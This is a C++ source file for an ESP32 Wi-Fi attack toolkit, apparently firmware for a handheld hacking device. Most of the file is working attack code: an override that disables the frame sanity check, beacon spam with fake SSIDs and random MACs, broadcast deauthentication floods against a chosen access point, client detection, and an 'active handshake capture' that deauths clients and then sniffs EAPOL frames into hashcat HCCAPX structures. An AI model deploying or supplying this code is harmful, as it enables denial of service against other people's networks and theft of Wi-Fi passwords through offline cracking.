#include "WiFiTools.h"

#include <SD.h>
#include <WiFi.h>

#include <vector>

#include "esp_event.h"
#include "esp_event_loop.h"
#include "esp_log.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "freertos/FreeRTOS.h"
#include "nvs_flash.h"

// Forward declarations of ESP-IDF functions
esp_err_t esp_wifi_set_channel(uint8_t primary, wifi_second_chan_t second);
esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void* buffer, int len, bool en_sys_seq);
esp_err_t esp_wifi_set_storage(wifi_storage_t storage);
esp_err_t esp_wifi_set_mode(wifi_mode_t mode);
esp_err_t esp_wifi_start();
esp_err_t esp_wifi_set_promiscuous(bool en);

// Define the global instance
WiFiTools* globalWiFiToolsInstance = nullptr;

// Overwrite the function to prevent the sanity check from returning an error allowing the raw frame to be sent
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

// Constructor
WiFiTools::WiFiTools() {
    // Initialize the Wi-Fi configuration
    globalWiFiToolsInstance = this;
}

void WiFiTools::initWiFiTools(fs::SDFS& sdInstance) {
    sd = &sdInstance;
}

void WiFiTools::beaconSpamSetup() {
    // Initialize esp_wifi
    esp_err_t err = esp_wifi_init(&cfg);
    if (err != ESP_OK) {
        Serial.printf("Error: %s\n", esp_err_to_name(err));
        return;
    }

    // Set WiFi storage to RAM
    err = esp_wifi_set_storage(WIFI_STORAGE_RAM);
    if (err != ESP_OK) {
        Serial.printf("Error: %s\n", esp_err_to_name(err));
        return;
    }

    // Set WiFi mode to STA
    err = esp_wifi_set_mode(WIFI_MODE_STA);
    if (err != ESP_OK) {
        Serial.printf("Error: %s\n", esp_err_to_name(err));
        return;
    }

    // Start WiFi
    err = esp_wifi_start();
    if (err != ESP_OK) {
        Serial.printf("Error: %s\n", esp_err_to_name(err));
        return;
    }

    // Set WiFi to promiscuous mode
    err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) {
        Serial.printf("Error: %s\n", esp_err_to_name(err));
        return;
    }
}

void WiFiTools::nextChannel() {
    // Increment the channel index
    channelIndex = (channelIndex + 1) % 14;  // Assuming 14 channels
    if (channelIndex == 0) {
        channelIndex = 1;
    }
    // Set the WiFi channel
    esp_wifi_set_channel(channelIndex, WIFI_SECOND_CHAN_NONE);
}

void WiFiTools::generateRandomMac() {
    // Generate a random MAC address
    for (int i = 0; i < 6; i++) {
        randomMacAddr[i] = random(0, 255);
    }
}

void WiFiTools::rickRollBeaconSpam(int duration = 15000) {
    beaconSpamSetup();

    // Stop current WiFi connection and transition to AP mode
    WiFi.disconnect();

    // create empty SSID
    for (int i = 0; i < 32; i++)
        emptySSID[i] = ' ';

    // set packetSize
    packetSize = sizeof(beaconPacket);

    if (wpa2) {
        beaconPacket[34] = 0x31;
    } else {
        beaconPacket[34] = 0x21;
        packetSize -= 26;
    }

    // change WiFi mode to AP mode
    WiFi.mode(WIFI_AP);

    // set channel
    esp_err_t err = esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        Serial.printf("Error: %s\n", esp_err_to_name(err));
        return;
    }

    delay(1000);
    long startTime = millis();
    while (millis() - startTime < duration) {
        // loop through all SSIDs
        for (int i = 0; i < 8; i++) {
            // generate random MAC address
            generateRandomMac();

            // set MAC address in beacon packet
            memcpy(&beaconPacket[10], randomMacAddr, 6);
            memcpy(&beaconPacket[16], randomMacAddr, 6);

            // reset SSID
            memcpy(&beaconPacket[38], emptySSID, 32);

            // get length of SSID
            uint8_t ssidLength = strlen_P(rickRollSSIDs[i]);

            // write new SSID into beacon frame
            memcpy_P(&beaconPacket[38], (const char*)pgm_read_ptr(&rickRollSSIDs[i]), ssidLength);

            // set channel for beacon frame
            beaconPacket[82] = channelIndex;

            for (int j = 0; j < 100; j++) {
                // send beacon frame
                err = esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, packetSize, false);
                if (err != ESP_OK) {
                    // Serial.printf("Failed to send beacon: %s\n", esp_err_to_name(err));
                }
                delay(1);
            }

            delay(1);

            nextChannel();
        }
    }

    Serial.println("Finished rickRollBeaconSpam");

    // Stop WiFi
    WiFi.mode(WIFI_OFF);
    Serial.println("WiFi stopped");
}

void WiFiTools::scanWiFiNetworks() {
    // Clear the foundWiFiNetworks vector
    foundWiFiNetworks.clear();

    // Get a list of available networks displaying their SSID, MAC address and channel
    int numNetworks = WiFi.scanNetworks();
    Serial.printf("Found %d networks\n", numNetworks);

    for (int i = 0; i < numNetworks; i++) {
        // Serial.printf("Network %d: %s, MAC: %s, Channel: %d\n", i, WiFi.SSID(i).c_str(), WiFi.BSSIDstr(i).c_str(), WiFi.channel(i));
        wifi_ap_record_t ap;
        ap.rssi = WiFi.RSSI(i);
        ap.authmode = WiFi.encryptionType(i);
        ap.primary = WiFi.channel(i);
        memcpy(ap.bssid, WiFi.BSSID(i), 6);
        memcpy(ap.ssid, WiFi.SSID(i).c_str(), 32);
        foundWiFiNetworks.push_back(ap);
    }
}

std::vector<wifi_ap_record_t> WiFiTools::getAvailableNetworks() {
    if (foundWiFiNetworks.size() == 0) {
        scanWiFiNetworks();
    }
    return foundWiFiNetworks;
}

void WiFiTools::clearFoundWiFiNetworks() {
    foundWiFiNetworks.clear();
}

void WiFiTools::sendDeauthPacket(uint8_t* apMac, uint8_t* stMac, uint8_t channel, uint8_t reasonCode) {
    // build the deauth packet
    uint16_t deauthPacketSize = sizeof(deauthPacket);
    uint8_t deauthPacketToTransmit[deauthPacketSize];
    memcpy(deauthPacketToTransmit, deauthPacket, deauthPacketSize);

    memcpy(&deauthPacketToTransmit[4], stMac, 6);
    memcpy(&deauthPacketToTransmit[10], apMac, 6);
    memcpy(&deauthPacketToTransmit[16], apMac, 6);
    deauthPacketToTransmit[24] = reasonCode;

    deauthPacketToTransmit[0] = 0xC0;

    // Set channel
    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        Serial.printf("Failed to set channel: %d\n", err);
        return;
    }

    // Ensure WiFi interface is set to AP mode
    err = esp_wifi_set_mode(WIFI_MODE_AP);
    if (err != ESP_OK) {
        Serial.printf("Failed to set WiFi mode: %d\n", err);
        Serial.printf("Error: %s\n", esp_err_to_name(err));
        return;
    }

    // Set WiFi to promiscuous mode
    err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) {
        Serial.printf("Failed to set WiFi to promiscuous mode: %d\n", err);
        Serial.printf("Error: %s\n", esp_err_to_name(err));
        return;
    }

    // Send the deauth packet
    err = esp_wifi_80211_tx(WIFI_IF_AP, deauthPacketToTransmit, deauthPacketSize, false);
    if (err != ESP_OK) {
        Serial.printf("Failed to send deauth: %d\n", err);
        Serial.printf("Error: %s\n", esp_err_to_name(err));
    } else {
        Serial.println("Deauth sent successfully");
    }
}

void WiFiTools::deauthNetwork(uint8_t* networkSSID = NULL, uint8_t* networkBSSID = NULL, uint8_t channel = NULL, int availableNetworkIndex = -1, uint8_t* targetMacAddr = NULL, int numPackets = 1, int delayMs = 100, uint8_t reasonCode = 2) {
    uint8_t apMac[6];
    uint8_t stMac[6];
    uint8_t targetMac[6];

    // Check if networkSSID, networkBSSID, and channel are provided
    if (networkSSID != NULL && networkBSSID != NULL && channel != NULL) {
        // Set the variables for the deauth packet
        memcpy(apMac, networkBSSID, 6);

        // Set the target MAC address
        if (targetMacAddr != NULL) {
            memcpy(targetMac, targetMacAddr, 6);
        } else {
            // Set the target MAC address to broadcast
            memset(targetMac, 0xFF, 6);
        }
    } else if (availableNetworkIndex >= 0 && availableNetworkIndex < foundWiFiNetworks.size()) {
        // Set the variables for the deauth packet
        memcpy(apMac, foundWiFiNetworks[availableNetworkIndex].bssid, 6);

        // Set the target MAC address
        if (targetMacAddr != NULL) {
            memcpy(targetMac, targetMacAddr, 6);
        } else {
            // Set the target MAC address to broadcast
            memset(targetMac, 0xFF, 6);
        }

        // Set the channel
        channel = foundWiFiNetworks[availableNetworkIndex].primary;
    } else {
        Serial.println("Error: Network information not provided");
        return;
    }

    for (int i = 0; i < numPackets; i++) {
        // Send the deauth packet
        sendDeauthPacket(apMac, targetMac, channel, reasonCode);
        delay(delayMs);
    }

    Serial.println("Deauth attack complete");

    // Stop WiFi
    WiFi.mode(WIFI_OFF);
    Serial.println("WiFi stopped");
}

void WiFiTools::filterForClients(const wifi_ieee80211_mac_hdr_t* hdr) {
    // Check if the packet flag is set to CLIENT_DETECTION
    if (packetScanFlag == CLIENT_DETECTION) {
        // Check if the MAC address is already in the list
        for (auto client : detectedClients) {
            if (memcmp(hdr->addr2, client, 6) == 0) {
                return;
            }
        }

        // Add the MAC address to the list
        uint8_t* client = new uint8_t[6];
        memcpy(client, hdr->addr2, 6);
        detectedClients.push_back(client);

        // DEBUG
        Serial.printf("Client detected: %02X:%02X:%02X:%02X:%02X:%02X\n", client[0], client[1], client[2], client[3], client[4], client[5]);
    }
}

void WiFiTools::filterForHandshakes(void* buf, wifi_promiscuous_pkt_type_t type) {
    // Cast the buffer to the Wi-Fi packet structure
    const wifi_promiscuous_pkt_t* ppkt = (wifi_promiscuous_pkt_t*)buf;
    const wifi_ieee80211_packet_t* ipkt = (wifi_ieee80211_packet_t*)ppkt->payload;
    const wifi_ieee80211_mac_hdr_t* hdr = &ipkt->hdr;

    // DEBUG
    // Serial.println("filterForHandshakes function");

    // Pointer to the payload of the data frame
    const uint8_t* payload = ipkt->payload;

    // Check for EAPOL packets
    if (payload[0] == 0x88 && payload[1] == 0x8e) {
        // DEBUG
        Serial.println("EAPOL packet detected");

        // Create a new HCCAPX structure
        HCCAPX hccapx;

        // Copy the AP MAC address
        memcpy(hccapx.ap_mac, hdr->addr3, 6);

        // Copy the STA MAC address
        memcpy(hccapx.sta_mac, hdr->addr2, 6);

        // Ensure the EAPOL data length does not exceed the buffer size
        size_t eapol_len = ppkt->rx_ctrl.sig_len;
        if (eapol_len > sizeof(hccapx.eapol)) {
            eapol_len = sizeof(hccapx.eapol);
        }
        memcpy(hccapx.eapol, payload, eapol_len);
        hccapx.eapol_len = eapol_len;

        // Ensure the ESSID length does not exceed the buffer size
        size_t essid_len = payload[50];
        if (essid_len > sizeof(hccapx.essid)) {
            essid_len = sizeof(hccapx.essid);
        }
        memcpy(hccapx.essid, payload + 51, essid_len);
        hccapx.essid_len = essid_len;

        // Extract Replay Counter (offset 7-14 in EAPOL-Key frame)
        memcpy(hccapx.replay_counter, payload + 7, sizeof(hccapx.replay_counter));

        // Extract Key MIC (offset 81-96 in EAPOL-Key frame)
        memcpy(hccapx.keymic, payload + 81, sizeof(hccapx.keymic));

        // Add the HCCAPX structure to the captured packets vector
        // capturedPackets.push_back((uint8_t*)&hccapx);

        // DEBUG
        Serial.printf("AP MAC: %02X:%02X:%02X:%02X:%02X:%02X\n", hccapx.ap_mac[0], hccapx.ap_mac[1], hccapx.ap_mac[2], hccapx.ap_mac[3], hccapx.ap_mac[4], hccapx.ap_mac[5]);
        Serial.printf("STA MAC: %02X:%02X:%02X:%02X:%02X:%02X\n", hccapx.sta_mac[0], hccapx.sta_mac[1], hccapx.sta_mac[2], hccapx.sta_mac[3], hccapx.sta_mac[4], hccapx.sta_mac[5]);
        Serial.printf("ESSID: %.*s\n", hccapx.essid_len, hccapx.essid);
        Serial.printf("EAPOL Length: %d\n", hccapx.eapol_len);
    }
}

void WiFiTools::promiscuousPacketHandler(void* buf, wifi_promiscuous_pkt_type_t type) {
    // DEBUG
    // Serial.println("promiscuousPacketHandler function");

    // Cast the buffer to the Wi-Fi packet structure
    const wifi_promiscuous_pkt_t* ppkt = (wifi_promiscuous_pkt_t*)buf;
    const wifi_ieee80211_packet_t* ipkt = (wifi_ieee80211_packet_t*)ppkt->payload;
    const wifi_ieee80211_mac_hdr_t* hdr = &ipkt->hdr;

    // Ensure a global or singleton instance of WiFiTools is available
    extern WiFiTools* globalWiFiToolsInstance;  // Declare global instance
    if (!globalWiFiToolsInstance) {
        return;  // Safety check to ensure instance is available
    }

    WiFiTools* instance = globalWiFiToolsInstance;

    // Check if the packet's BSSID matches the target BSSID
    if (memcmp(hdr->addr3, instance->targetBSSID, 6) == 0) {
        // DEBUG
        // Serial.println("Packet matches target BSSID");

        // Check if the packet flag is set to CLIENT_DETECTION
        if (instance->packetScanFlag == CLIENT_DETECTION) {
            // DEBUG
            // Serial.println("Filtering for clients");

            // Filter for client MAC addresses
            instance->filterForClients(hdr);
        } else if (instance->packetScanFlag == HANDSHAKE_CAPTURE) {
            // DEBUG
            // Serial.println("Filtering for handshakes");

            // Filter for handshake packets
            instance->filterForHandshakes(buf, type);
        }
    }
}

void WiFiTools::processWiFiData(uint8_t* networkBSSID, uint8_t channel, int captureTime, bool captureHandshake, bool detectClients) {
    // Set the Wi-Fi channel and enable promiscuous mode
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous_rx_cb(promiscuousPacketHandler);
    esp_wifi_set_promiscuous(true);

    uint32_t startTime = millis();

    // Implement logic within a global or static packet handler
    static WiFiTools* instance = this;

    // Packet capture loop
    while (millis() - startTime < captureTime) {
        // Processing is handled in the callback
        delay(1);
    }

    // Disable promiscuous mode
    esp_wifi_set_promiscuous(false);

    // Set the packet scan flag to NONE, and captureHandshake and detectClients to false
    packetScanFlag = NONE;
    captureHandshake = false;
    detectClients = false;
}

void WiFiTools::handshakeCapture(uint8_t* networkBSSID = NULL, uint8_t channel = NULL, int availableNetworkIndex = NULL, int captureTime = 10000) {
    // Check if availableNetworkIndex is provided
    if (availableNetworkIndex >= 0 && availableNetworkIndex < foundWiFiNetworks.size()) {
        // Set the attack variables
        targetChannel = foundWiFiNetworks[availableNetworkIndex].primary;
        memcpy(targetBSSID, foundWiFiNetworks[availableNetworkIndex].bssid, 6);
    } else if (networkBSSID != NULL && channel != NULL) {
        // Set the attack variables
        targetChannel = channel;
        memcpy(targetBSSID, networkBSSID, 6);
    } else {
        Serial.println("Error: Network information not provided");
        return;
    }

    // Set the packet scan flag to HANDSHAKE_CAPTURE
    packetScanFlag = HANDSHAKE_CAPTURE;

    // DEBUG
    Serial.printf("Target BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n", targetBSSID[0], targetBSSID[1], targetBSSID[2], targetBSSID[3], targetBSSID[4], targetBSSID[5]);
    Serial.printf("Target Channel: %d\n", targetChannel);
    Serial.printf("Capture Time: %d\n", captureTime);
    Serial.println("Starting handshake capture");

    // Call the processWiFiData function to capture handshake packets
    processWiFiData(targetBSSID, targetChannel, captureTime, true, false);

    Serial.println("Handshake capture complete");
}

void WiFiTools::activeHandshakeCapture(uint8_t* networkBSSID = NULL, uint8_t channel = NULL, int availableNetworkIndex = NULL, int captureTime = 10000) {
    // Check if availableNetworkIndex is provided
    if (availableNetworkIndex >= 0 && availableNetworkIndex < foundWiFiNetworks.size()) {
        // Set the attack variables
        targetChannel = foundWiFiNetworks[availableNetworkIndex].primary;
        memcpy(targetBSSID, foundWiFiNetworks[availableNetworkIndex].bssid, 6);
    } else if (networkBSSID != NULL && channel != NULL) {
        // Set the attack variables
        targetChannel = channel;
        memcpy(targetBSSID, networkBSSID, 6);
    } else {
        Serial.println("Error: Network information not provided");
        return;
    }

    // DEBUG
    Serial.printf("Target BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n", targetBSSID[0], targetBSSID[1], targetBSSID[2], targetBSSID[3], targetBSSID[4], targetBSSID[5]);
    Serial.printf("Target Channel: %d\n", targetChannel);
    Serial.printf("Capture Time: %d\n", captureTime);
    Serial.println("Starting active handshake capture");
    Serial.println("Deauthenticating clients prior to capturing handshake packets");

    // Call the deauthNetwork function to deauthenticate clients prior to capturing handshake packets
    deauthNetwork(NULL, targetBSSID, targetChannel, NULL, NULL, 500, 10, 2);

    Serial.println("Deauthentication complete");
    Serial.println("Starting handshake capture");
    // Call the processWiFiData function to capture handshake packets
    processWiFiData(targetBSSID, targetChannel, captureTime, true, false);

    Serial.println("Handshake capture complete");
}

void WiFiTools::findClients(uint8_t* networkBSSID = NULL, uint8_t channel = NULL, int availableNetworkIndex = NULL, int captureTime = 10000) {
    // Check if availableNetworkIndex is provided
    if (availableNetworkIndex >= 0 && availableNetworkIndex < foundWiFiNetworks.size()) {
        // Set the attack variables
        targetChannel = foundWiFiNetworks[availableNetworkIndex].primary;
        memcpy(targetBSSID, foundWiFiNetworks[availableNetworkIndex].bssid, 6);
    } else if (networkBSSID != NULL && channel != NULL) {
        // Set the attack variables
        targetChannel = channel;
        memcpy(targetBSSID, networkBSSID, 6);
    } else {
        Serial.println("Error: Network information not provided");
        return;
    }

    // Set the packet scan flag to CLIENT_DETECTION
    packetScanFlag = CLIENT_DETECTION;

    // DEBUG
    Serial.printf("Target BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n", targetBSSID[0], targetBSSID[1], targetBSSID[2], targetBSSID[3], targetBSSID[4], targetBSSID[5]);
    Serial.printf("Target Channel: %d\n", targetChannel);
    Serial.printf("Capture Time: %d\n", captureTime);
    Serial.println("Starting client detection");

    // Call the processWiFiData function to detect client MAC addresses
    processWiFiData(targetBSSID, targetChannel, captureTime, false, true);

    Serial.println("Client detection complete");
}